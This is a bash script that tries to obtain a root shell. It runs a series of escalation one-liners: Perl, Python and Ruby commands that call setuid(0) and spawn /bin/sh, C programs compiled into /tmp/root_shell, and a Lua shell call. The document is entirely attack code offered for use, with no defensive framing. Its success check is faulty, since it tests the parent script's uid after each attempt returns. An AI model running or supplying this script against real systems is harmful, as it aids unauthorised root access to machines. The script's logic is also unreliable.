#!/bin/bash

# Function to attempt each command and check if we got a root shell
attempt_command() {
    echo "Attempting: $1"
    eval "$1"
    if [ "$(id -u)" -eq 0 ]; then
        echo "Root shell obtained!"
        exec /bin/sh
    else
        echo "Privilege escalation failed for: $1"
    fi
}

# Perl command
perl_cmd='perl -e "use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";"'
attempt_command "$perl_cmd"

# Python command
python_cmd='python -c "import os; os.setuid(0); os.system(\"/bin/sh\")"'
attempt_command "$python_cmd"

# Ruby command
ruby_cmd='ruby -e "Process::Sys.setuid(0); exec \"/bin/sh\""'
attempt_command "$ruby_cmd"

# Bash command with C program
bash_c_cmd='echo "int main() { setuid(0); system(\"/bin/sh\"); return 0; }" > /tmp/root_shell.c && gcc /tmp/root_shell.c -o /tmp/root_shell && /tmp/root_shell'
attempt_command "$bash_c_cmd"

# Direct C one-liner
c_cmd='echo "main(){setuid(0);system(\"/bin/sh\");}" | gcc -o /tmp/root_shell -xc - && /tmp/root_shell'
attempt_command "$c_cmd"

# Lua command
lua_cmd='lua -e "os.execute(\"/bin/sh\")"'
attempt_command "$lua_cmd"

echo "All attempts finished."

